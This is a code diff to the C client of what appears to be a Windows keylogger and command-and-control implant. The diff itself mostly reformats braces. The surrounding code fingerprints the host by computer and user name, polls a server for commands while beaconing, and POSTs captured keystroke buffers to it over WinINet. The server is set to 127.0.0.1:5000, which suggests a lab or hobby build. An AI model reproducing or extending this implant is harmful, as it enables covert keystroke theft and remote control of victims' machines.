@@ -9,31 +9,30 @@
  */
 CLIENT_HANDLER* initClient() {
     CLIENT_HANDLER* client = (CLIENT_HANDLER *) malloc(sizeof(CLIENT_HANDLER));
-    if (client == NULL) return NULL;
+    if (client == NULL) { return NULL; }
 
     memset(client->id, '\0', MAX_ID_LEN);
-    // memset(client->keyBuffer, '\0', MAX_BUFF_LEN);
     memset(client->cmdBuffer, '\0', MAX_BUFF_LEN);
 
     // get the unique client ID as <user_name>-<compute_name>
     DWORD size = UNLEN + 1;
     char buffUser[size];
-    if (!GetUserNameA(buffUser, &size)) return NULL;
+    if (!GetUserNameA(buffUser, &size)) { return NULL; }
     
     size = MAX_COMPUTERNAME_LENGTH + 1;
     char buffCompName[size];
-    if (!GetComputerNameA(buffCompName, &size)) return NULL;  // failed to get computer name
+    if (!GetComputerNameA(buffCompName, &size)) { return NULL; }  // failed to get computer name
     
     // initialise the client id, we can now register them with the server
     sprintf(client->id, "%s-%s", buffCompName, buffUser);
     
     // establish connection
     HINTERNET hSession = InternetOpenA("server", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (hSession == NULL) return NULL;
+    if (hSession == NULL) { return NULL; }
     client->hSession = hSession;
 
     HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (hConnect == NULL) return NULL;
+    if (hConnect == NULL) { return NULL; }
     client->hConnect = hConnect;  // init client internet handle
 
     return client;
@@ -78,7 +77,7 @@ ERR_CODE registerClient(CLIENT_HANDLER *client) {
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) return ECODE_NULL;
+    if (hRequest == NULL) { return ECODE_NULL; }
 
     HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0);
     InternetCloseHandle(hRequest);
@@ -96,7 +95,7 @@ ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
 
     // set up the request
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) return ECODE_GET;
+    if (hRequest == NULL) { return ECODE_GET; }
 
     // send out the request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
@@ -124,7 +123,7 @@ ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bu
 
     // send logs
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) return ECODE_POST;
+    if (hRequest == NULL) { return ECODE_POST; }
 
     HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID)keyBuffer, bufferLen);
     InternetCloseHandle(hRequest);
@@ -133,12 +132,11 @@ ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bu
 }
 
 void clientCleanup(CLIENT_HANDLER *client) {
-    if (client == NULL) return;
+    if (client == NULL) { return; }
 
-    if (client->hConnect != NULL)
-        InternetCloseHandle(client->hConnect);
-    if (client->hSession != NULL)
-        InternetCloseHandle(client->hSession);
+    // close internet handles
+    if (client->hConnect != NULL) { InternetCloseHandle(client->hConnect); }
+    if (client->hSession != NULL) { InternetCloseHandle(client->hSession); }
     
     free(client);
 }
